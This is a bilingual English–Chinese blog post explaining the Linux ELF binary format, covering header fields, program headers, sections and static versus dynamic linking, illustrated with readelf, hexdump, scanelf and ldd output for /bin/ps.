&lt;p&gt;Before diving into more technical details, it might be good to explain why understanding of the ELF format is useful. As a starter, it helps to learn the inner workings of our operating system. When somehing goes wrong, we might better understand what happened (or why). Then there is the value in being able to research ELF files, e.g. after a security breach (incident response, malware research, forencis). Last but not least, for a better understanding while developing. Even if you program in a high-level language like Golang, you still might benefit from knowing what happens behind the scenes.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在更深入到技術細節之前，最好先解釋一下為什麼了解 ELF 格式是有用的，當作開頭，可以幫助學習我們作業系統裡面的運作原理。當某些東西出錯了，我們或許較能知道發生了什麼事情(或是為什麼)。這就是研究 ELF 檔案的價值所在，例如在一波資安攻擊之後(事件響應，惡意軟體研究，鑑識)。最後而同樣重要的是，能在開發時有更好的理解力。甚至當你在使用高級語言如 Golang，你仍可能受益於知曉該場景背後發生了些什麼事情。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;From source to process 從原始碼到行程&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So whatever operating system we run, it needs to translate common functions to the language of the CPU, also known as machine code. A function could be something basic like opening a file on disk or showing something on the screen. Instead of talking directly to the CPU, we use a programming language, using internal functions. A compiler then translates these functions into object code. This object code is then linked into a full program, by using a linked tool. The result is a binary file, which then can be executed on that specific platform and CPU type.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以無論我們運行任何作業系統，它需要將一般功能翻譯成 CPU 的語言，也被稱為機器語言。一個函式可被拆分成基本的指令像是在硬碟上開啟一個檔案或是顯示一些東西在螢幕上。儘管可以直接對 CPU 下達指令，我們使用一種程式語言，使用內部的函式。然後使用編譯器翻譯這些函式成為目的碼(編按: object code)。藉由使用連結工具這個物件碼將被連結成一個完整的程式。結果是一個可以執行在特定平台與 CPU 架構下的二進制檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Before you start 在開始之前&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This blog post will share a lot of commands. Don’t run them on production systems. Better do it on a test machine. If you like to test commands, copy an existing binary and use that. Additionally, we have provided a small C program, which can you compile. After all, trying out is the best way to learn and compare results.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個部落格文章將分享一堆指令。請勿在正式環境執行。最好是在測試環境上。如果你喜歡測試指令，複製一個已存在的二進制檔並使用他們。此外，我們提共了一個小型的 C 語言程式，你可以自行嘗試編譯。總之，嘗試是最好的學習方式與比對結果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;not-just-executables-並非只是可執行檔&quot;&gt;Not Just Executables 並非只是可執行檔&lt;/h2&gt;

&lt;p&gt;A common misconception is that ELF files are just for executables. We already have seen they can be used for partial pieces (object code). Another example includes shared libraries, and even core dumps (those core or a.out files). ELF is also used for the kernel and kernel moduels on Linux machines.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一種常見的誤解是 ELF 檔案只會是可執行檔。我們已經看到他們可以被用來部份利用(object code). 另外一個例子包含 shared libries，而甚至 core dump (core 或 a.out 檔)。在 Linux 機器上 ELF 也被用在核心與核心模組。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;structure-結構&quot;&gt;Structure 結構&lt;/h2&gt;

&lt;p&gt;Due to the extensible design of ELF files, the structure differs per file. An ELF file consists of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;因為可擴充設計的緣故，每個檔案的結構不同。一個 ELF 檔案的組成有：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;ELF header (ELF 標頭)&lt;/li&gt;
  &lt;li&gt;File data (檔案資料)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;With the &lt;em&gt;readelf&lt;/em&gt; command we can look at the structure of a file and it will look something like this:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可以使用 &lt;em&gt;readelf&lt;/em&gt; 指令我們可以看到檔案的結構可以看到如下的畫面：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;elf-header--elf-標頭&quot;&gt;ELF header / ELF 標頭&lt;/h4&gt;

&lt;p&gt;As can be seen in this screenshot, the ELF header starts with some magic. While this might look fuzzy at first, it is a partial representation of the header data itself. The first 4 hexdecimal pieces define that this is an ELF file (45=E,4c=L,46=F), prefixed with the 7f value.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可由截圖看到，ELF 標頭從一些 magic 開始。或許一開始看起來會有點混論，那是一個表示標頭資料的部份。頭四個 16 進制部份定義了這是一個 ELF 檔(45=E,4c=L,46=F)，並由 7f 做為前置標記。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This ELF header is mandatory and ensures that data is correctly interpreted during linking or execution. To better understand the inner working of an ELF file, it is useful to know the file used. It is actually easier than it looks.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個 ELF 標頭是強制的並且可以確保資料正確的在連結或是執行階段被直譯。為了更好的了解 ELF 內部運作，了解使用到的檔案是有幫助的，實際上那比看上去的簡單。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;class--類別&quot;&gt;Class / 類別&lt;/h4&gt;

&lt;p&gt;After the ELF type declaration, there is a Class field defined. This value determines if the file is meant for a 32 (=1) or 64 (=2) bit architecture. The magic shows a 2, which is displayed by the readelf command as an ELF64 file. In other words, an ELF file using 64 bit architecture. Not surprising, as this particular machine contains a modern CPU.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在 ELF 類型宣告之後，有定義一個類別的欄位。這個值決定這個檔案是 32 或是 64 位元架構。magic 顯示一個 2，被 readelf 指令顯示為 ELF64 的檔案。換句話說，一個 ELF 檔案使用 64 位元架構。不意外的，這個特定機器包含一個現代 CPU。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;data-資料&quot;&gt;Data 資料&lt;/h4&gt;

&lt;p&gt;Next there is a data field. It knows two options: 01 for LSB (Least Significant Bit), also known as little-endian. The there is the value 02, for MSB (Most Significant Bit, big-endian). This particular value helps to interpret the remaining objects correctly within the file. This is important, as different types of processors deal differently with the incoming instructions and data structures. In this case LSB is used, which is common for AMD64 type processors.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;接下來有一個資料欄位。它有兩個選項： 01 表示 LSB(Least Significant Bit)，也被稱為 little-endian。這個特定值幫助正確的直譯在檔案中剩下的物件。這是非常重要的，不同的處理器使用不同的方式處理接收到的指令與資料結構。這個案例使用 LSB，是普遍 AMD64 處理器的型態。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The effect of LSB becomes visible when using hexdump on a binary file like /bin/ps.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;當對一個二進位檔如 /bin/ps 使用 hexdump 則效果是顯而易見的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -n 16 /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the value pairs are different, which is caused by the right interpretation of the byte order.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們可以看到一對值是不同的，因為是由右開始解釋的位元組順序。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;version-版本&quot;&gt;Version 版本&lt;/h4&gt;

&lt;p&gt;Next in line is another “01” in the magic, which is the version number. Currently, there is only 1 version type: currently, which is the value “01”. So nothing interesting to remember.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下一個要講的是在 magic 裡面的另外一個 “01”，表示的是版本號。目前只有一種版本類型: 就是 “01” 這個值。所以沒啥有趣的東東好記的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;osabi-and-abi-version-作業系統應用二進為介面與應用二進為介面版本&quot;&gt;OS/ABI and ABI version 作業系統/應用二進為介面與應用二進為介面版本&lt;/h3&gt;

&lt;p&gt;Each operating system has a big overlap in common functions. In addition, each of them has specific ones, or at least minor differences between them. To ensure the right functions are used, an application binary interface (ABI), is defined. This way the operating system and applications both know what to expect and functions are correctly forwarded. These two fields describe what ABI is used and the related version. For Linux systems this is the SystemV.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;每個作業系統在常見的函式上常有重疊。另外，他們每一個都有一個特例，或是之間存在微小的差異。為了確保使用正確的函式，才定義了一個應用二進位介面 (ABI)。如此一來作業系統與應用程式便可以預期甚麼樣的事情及功能會被傳遞過來。這兩個欄位描述了 ABI 被使用及其相關的版本。對 Linux 系統來說就是 SystemV。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;machine-機器&quot;&gt;Machine 機器&lt;/h3&gt;

&lt;p&gt;In the header we can also find the expected machine type(AMD64)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在標頭我們也可以找到預期的機器類型 (AMD64)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;type-型態&quot;&gt;Type 型態&lt;/h4&gt;

&lt;p&gt;The &lt;strong&gt;type&lt;/strong&gt; field tells us what the purpose of the file is.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;類型欄位這個檔案的用途為何&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Usually it is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;它通常是:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;DYN(Shared object file), for libraries&lt;/li&gt;
  &lt;li&gt;EXEC (Executable file), for binaries&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;REL(Relocatable file), before linked into an executable file&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;DYN (共享物件檔)，函式庫&lt;/li&gt;
  &lt;li&gt;EXEC (可執行檔)，二進位檔案&lt;/li&gt;
  &lt;li&gt;REL (可重定位檔)，連結進一個執行檔前的檔案&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;machine--機器&quot;&gt;Machine / 機器&lt;/h4&gt;

&lt;p&gt;While some of the fields could already be displayed via the magic value of the readelf output, there is more. For example for waht specific processor type the file is. Using hexdump we can see the real values.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;某些欄位可以透過 readelf 輸出顯示其魔術值，但其實還有更多。舉例來說: 該檔案的指定處理器類型是哪一個。使用 hexdump 我們可以看到真實的資料。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;.ELF…………&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;02 00 &lt;strong&gt;3e&lt;/strong&gt; 00 01 00 00 00 a8 2b 40 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;..&amp;gt;……+@…..&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;40 00 00 00 00 00 00 00 30 65 01 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;@…….0e……&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;00 00 00 00 40 00 38 00 09 00 40 00 1c 00 1b 00&lt;/td&gt;
          &lt;td&gt;….@.8…@…..&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;(Output created with hexdump -C -n 64 /bin/ps)&lt;/em&gt;
&lt;em&gt;(透過 hexdump -C -n 64 /bin/ps 製造的輸出)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The highlighted field above is what defines the machine type. The value 3e is 62 in decimal, which equals to AMD64. To get an idea of all machine types, have a look at this &lt;em&gt;ELF header file&lt;/em&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;上面粗體的欄位就是定義了機器類型。3e 就是十進位的 62，表示的是 AMD64。若想知道更多機器類型，瞧一瞧這個吧&lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF header file&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With all these fields clarified, it is time to look at where the real magic happens and move into the next headers!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;透過這幾個欄位的闡述，該是時候看看真正魔法並進到後面的標頭了!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;file-data--檔案資料&quot;&gt;File data / 檔案資料&lt;/h4&gt;

&lt;p&gt;Besides the ELF header, ELF files consist of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 ELF 標頭之外，ELF 檔案的組成為:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Program Headers or Segments(9) (程式標頭 或 區段)&lt;/li&gt;
  &lt;li&gt;Section Headers or Sections(28) (節區標頭 或 節區)&lt;/li&gt;
  &lt;li&gt;Data (資料)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before we dive into these headers, it is good to know that ELF has two complementary “views”. One for used for the linker to allow execution (segments), one for categorizing instructins and data (sections). So depending on the goal, the related header types are used. Let’s start with program headers, which we find on ELF binaries.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在我們深入這些標頭之前，了解到 ELF 有兩個互補的”視圖”是再好不過了。一個是為了可以讓連結器執行 (區段)，一個用來分類指令(編按: 原文typo，應為 instruction)與資料 (節區)，基於這個目標，相關的標頭類型將被使用到。讓我們從 ELF 二進位檔中找到的程式標頭們開始吧。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;program-headers--程式標頭&quot;&gt;Program headers / 程式標頭&lt;/h3&gt;

&lt;p&gt;An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution. When the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headrs, otherwise it won’t run. And it uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一個 ELF 檔案由零個或更多區段組成，並且描述如何創造一個執行時期的行程/記憶體映像。當核心看到這些區段，它使用系統呼叫 mmap(2) 將他們映射到虛擬位址空間，換句話來說，它轉換預先定義的指令到記憶體映像中。如果你的 ELF 檔案是一個普通的二進位檔，它將需求這些程式標頭，否則無法運行。並且它使用這些標頭，與底層資料結構來形成一個程序。這個程序與共享函式庫類似。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://assets.linux-audit.com/wp-content/uploads/2015/08/elf-program-headers-segments.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An overview of program heders in an ELF binary&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一個 ELF 二進位檔中的程式標頭概觀&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We see in this example that there are 9 program headers. When looking at it for the first time, it hard to understand what happens here. So let’s go into a few details.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們看到這個範例有 9 個程式標頭。當第一次看到的時候，它(編按: 原文應該少了 is)讓人難以理解這在搞啥。所以讓我進入到一點細節部分。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;GNU_EH_FRAME&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is a sorted queue, used by the GNU C (gcc), to store exeception handlers. So when something goes wrong, it can use this part to deal correctly with it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;被 GNU C (gcc) 所使用的是一個排序過的佇列，來存放意外處理器。所以當某東西出錯了，它可以使用這個部分來處理修正錯誤。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;GNU_STACK&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This header is used to sotre stack information. The stack is a buffer, or scratch place, where items are stored, like local variables. This will occur with LIFO(Last In, First Out), similar to putting boxes on top of each other. When a process function is started a block is reserved. When the funtion is finished, it will be marked as free again. Now the interesting part is that a stack shouldn’t be executable, as this might introduce security vulnerabilities. By manipulation of memory, one could refer to this executable stack and run intended instructions.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個標頭被用來存放堆疊資訊。堆疊是一個緩衝區，或是一個存放龐雜物品的地方，像是區域變數。這裡的運作是 LIFO(後進先出)，類似於把一個盒子放置於其他盒子之上。當一個程序函式開始執行，就會有一個區塊被保留。當函式結束該區塊將再次被標記為自由。如今有趣的部分是，堆疊不該為可執行，當作是介紹安全弱點。透過操作記憶體，其他地方可能參考到這個可執行的堆疊並故意運行一些指令。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If the GNU_STACK segment is not available, then usasally an executable stack is used. The scanelf and execstack tools are two examples to show the stack details.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果 GNU_STACK 區段並非可用的，則通常可執行的堆疊會被使用。 &lt;code class=&quot;highlighter-rouge&quot;&gt;scanelf&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;execstack&lt;/code&gt; 是兩個可以呈現堆疊詳細資訊的工具。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# scanelf -e /bin/ps&lt;/span&gt;
 TYPE   STK/REL/PTL FILE 
ET_EXEC RW- R-- RW- /bin/ps

&lt;span class=&quot;c&quot;&gt;# execstack -q /bin/ps&lt;/span&gt;
- /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Commands to see program headers&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;可以看程式標頭的指令&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;dumpelf (pax-utils)&lt;/li&gt;
  &lt;li&gt;elfls -S /bin/ps&lt;/li&gt;
  &lt;li&gt;eu-readelf -program-headers /bin/ps&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;sections--節區&quot;&gt;Sections / 節區&lt;/h3&gt;

&lt;h4 id=&quot;section-headers--節區標頭&quot;&gt;Section headers / 節區標頭&lt;/h4&gt;

&lt;p&gt;The section headres define all the sections in the file. As said, this “view” is used for linking and relocation.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;節區標頭定義了在檔案中的所有節區。就像前面提到的，這個”視圖”視被用來連結與重定位的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Sections can be found in an ELF binary after the GNU C compiler transformed C code into assembly, followed by the GNU assembler, which creates objects of it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;節區可以在 GNU C 編譯器將 C 程式碼轉換成組合語言且被後面的 GNU 組譯器，在 ELF 二進位檔中發現，&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As the image above shows, a segment can have 0 or more sections. For executable files there are four main sections: &lt;strong&gt;.text&lt;/strong&gt;, &lt;strong&gt;.data&lt;/strong&gt;, &lt;strong&gt;.rodata&lt;/strong&gt;, and &lt;strong&gt;.bss&lt;/strong&gt;. Each of these sections are loaded with different access rights, which can be seen with &lt;strong&gt;readelf -S&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如上面的圖所示，一個區段可以擁有 0 或更多個節區。以可執行檔來說有主要四個節區: &lt;strong&gt;.text&lt;/strong&gt;、&lt;strong&gt;.data&lt;/strong&gt;、&lt;strong&gt;.rodata&lt;/strong&gt;與 &lt;strong&gt;.bss&lt;/strong&gt;。這每一個節區都被載入且擁有不同的存取權限，可以用 &lt;strong&gt;readelf -S&lt;/strong&gt; 來查看。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;text--程式碼區段&quot;&gt;.text / 程式碼區段&lt;/h4&gt;

&lt;p&gt;Contains executable code. It will be packed into a segment with read and execute access rights. It is only loaded once, as the contents will not change. This can be seen with the &lt;strong&gt;objdump&lt;/strong&gt; utility.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;包含可執行程式碼。程式碼將被包裝到一個區段中，有可讀可執行的權限並且它只會被載入一次，因為程式碼內容不會改變。可以使用 &lt;strong&gt;objdump&lt;/strong&gt; 工具查看。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;12 &lt;strong&gt;.text&lt;/strong&gt; 0000a3e9 0000000000402120 0000000000402120 00002120 2&lt;strong&gt;4&lt;br /&gt;
CONTENTS, ALLOC, LOAD, **READONLY&lt;/strong&gt;, &lt;strong&gt;CODE&lt;/strong&gt;&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;data--資料區段&quot;&gt;.data / 資料區段&lt;/h4&gt;

&lt;p&gt;Initialized data, with read/write access rights.&lt;/p&gt;

&lt;p&gt;初始化後的資料，有可讀可寫的權限。&lt;/p&gt;

&lt;h4 id=&quot;rodata--唯讀資料區段&quot;&gt;.rodata / 唯讀資料區段&lt;/h4&gt;

&lt;p&gt;Initialized data, with read access rights only (=A).&lt;/p&gt;

&lt;p&gt;初始化後的資料，只有可讀的權限。&lt;/p&gt;

&lt;h4 id=&quot;bss--位初始化資料區段&quot;&gt;.bss / 位初始化資料區段&lt;/h4&gt;

&lt;p&gt;Uninitialized data, with read/write access rights (=WA)&lt;/p&gt;

&lt;p&gt;未初始化的資料，有可讀可寫的權限&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;[24] .data PROGBITS 00000000006172e0 000172e0&lt;br /&gt;
0000000000000100 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 8&lt;br /&gt;
[25] .bss NOBITS 00000000006173e0 000173e0&lt;br /&gt;
0000000000021110 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 32&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;Commands to see section and headers&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;用來看節區與標頭的指令&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;dumpelf&lt;/li&gt;
  &lt;li&gt;elfls -p /bin/ps&lt;/li&gt;
  &lt;li&gt;eu-readelf -section-headers /bin/ps&lt;/li&gt;
  &lt;li&gt;rreadelf -S /bin/ps&lt;/li&gt;
  &lt;li&gt;objudmp -h /bin/ps&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;section-groups--節區群組&quot;&gt;Section groups / 節區群組&lt;/h4&gt;

&lt;p&gt;Some sections can be grouped, as they form a whole, or in other words be a dependency. Newer linkers support this functionality. Still this is not common to find that often:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;某一些節區可以被群組起來成為一個整體，換句話說成為從屬關係，新一點的連結器才有支援這個功能。這仍然不是這麼常見:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;# readelf -g /bin/ps&lt;/p&gt;

    &lt;p&gt;There are no section groups in this file.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;While this might not be looking very interesting, it shows a clear benefit of reasearching the ELF toolkits which are available, for analysis. For this reason, an overview of tools and their primary goal have been included at the end of this article.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這看起或許並不有趣，可用的 ELF 工具組在研究與分析方面有顯著的益處，基於這個原因，一些工具與他們主要的用途概述將會在文末附上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;static-vs-dynamic--靜態-vs-動態&quot;&gt;Static VS Dynamic / 靜態 VS 動態&lt;/h3&gt;

&lt;p&gt;Another thing to mention before closing an introduction on the subject of ELF is static and dynamic binaries. For optimization purposes we often see that binaries are “dynamic”, which means it needs external components to run correctly. Often these external components are normal libraries, which contain common functions, like opening files or createing a network socket. Static binaries on the other hand have all libraries included, which make them bigger, yet more portable (e.g. using them on another system).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;另外一個在結束介紹 ELF 是靜態和動態二進位的主題前要提及的，為了最佳化的目的，我們通常將二進位檔視為”動態”，代表的是它需要額外的部件來正確運行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you want to check if a file is statically or dynamically compiled, use the file command. If it shows something like:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你要確認一個檔案是否為動態或是靜態編譯的，使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; 命令。如果它顯示如:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;$ file /bin/ps&lt;br /&gt;
/bin/ps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), &lt;strong&gt;dynamically linked (uses shared libs)&lt;/strong&gt;, for GNU/Linux 2.6.24, BuildID[sha1]=2053194ca4ee8754c695f5a7a7cff2fb8fdd297e, stripped&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;To determine what external libraries are being used, simply use the ldd on the same binary:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;要確認額外函式庫有那些被使用到，簡單的使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; 在同一個二進位檔上:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;$ ldd /bin/ps&lt;br /&gt;
linux-vdso.so.1 =&amp;gt; (0x00007ffe5ef0d000)&lt;br /&gt;
libprocps.so.3 =&amp;gt; /lib/x86_64-linux-gnu/libprocps.so.3 (0x00007f8959711000)&lt;br /&gt;
libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f895934c000)&lt;br /&gt;
/lib64/ld-linux-x86-64.so.2 (0x00007f8959935000)&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Tip:&lt;/strong&gt; To see underlying dependencie, it might be better to use the lddtree utility instead.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;小技巧:&lt;/strong&gt; 要看到底層依賴關係，使用 lddtree 工具來代替。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;what-did-we-learn---我們學到了什麼-&quot;&gt;What Did We Learn ? / 我們學到了什麼 ?&lt;/h2&gt;

&lt;p&gt;ELF files are for execution, or for linking. Depending on one of these goals, it contains the required segemnts or sections. Segments are viewed by the kernel and mapped into memory (using mmap). Sections are viewed by the linker to create executable code or shared objects.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF 檔案是用來執行或是連結的。基於其中一個目標，而包含要求的區段或是節區。區段是核心的觀點並映射到記憶體中(使用 mmap)。節區是連結器的觀點用來創造可執行程式碼或是分享物件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The ELF file type is very flexible and provides support for multiple CPU types, machine architectures, and operating systems. It is also very extensible: each file is differently constructed, depending on the required parts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF 檔案類型是非常彈性且提供許多支援的 CPU 類型、機器架構與作業系統。同時它具有可擴展性: 基於不同的要求，每個檔案有不同的構造。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Headers form an important part of the file, describing exactly the contents of and ELF file. By using the right tools, you can gain a basic understanding on the purpose of the file. From there on, you can further “interrogate” the binaries by determining the related functions it uses, or strings stored in the file. A great start for those who are into malware research, or want to know better how processes behave (or not behave!).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;標頭形成一個檔案重要的部分，精確的描述 ELF 檔案的內容。透過使用對的工具你可以獲得對檔案的目的有一個基本的了解。從現在開始，你可以進一步的”質問”二進位檔取決於，它使用的相關函式或是儲存在檔案你的字串。對於惡意軟體研究有興趣的人是一個好的開始，或是想要對程序行為有更好的了解 (或是程序不乖!)。(編按: behave 有乖巧的意味，這裡作者玩了個雙關)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;packages--套裝軟體&quot;&gt;Packages / 套裝軟體&lt;/h3&gt;

&lt;p&gt;Most Linux systems will already have the the binutils package installed. Other packages might help with showing much more details. Having the right toolkit might simplify your work, especially when doing analysis or learning more about ELF files. So we have collected a list of packages and the related utilities in it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;多數的 Linux 系統將已經安裝了 &lt;code class=&quot;highlighter-rouge&quot;&gt;binutils&lt;/code&gt; 套裝軟體(編按: 原文多打一個 the)。其他套裝軟體對顯示更多詳細資訊可能會有幫助，擁有隊的工具箱可以簡化你做的工。特別是在分析或是學習更多有關 ELF 檔案的時候。所以我們蒐集了一個套裝軟體清單與其相關的工具。&lt;/p&gt;
&lt;/blockquote&gt;

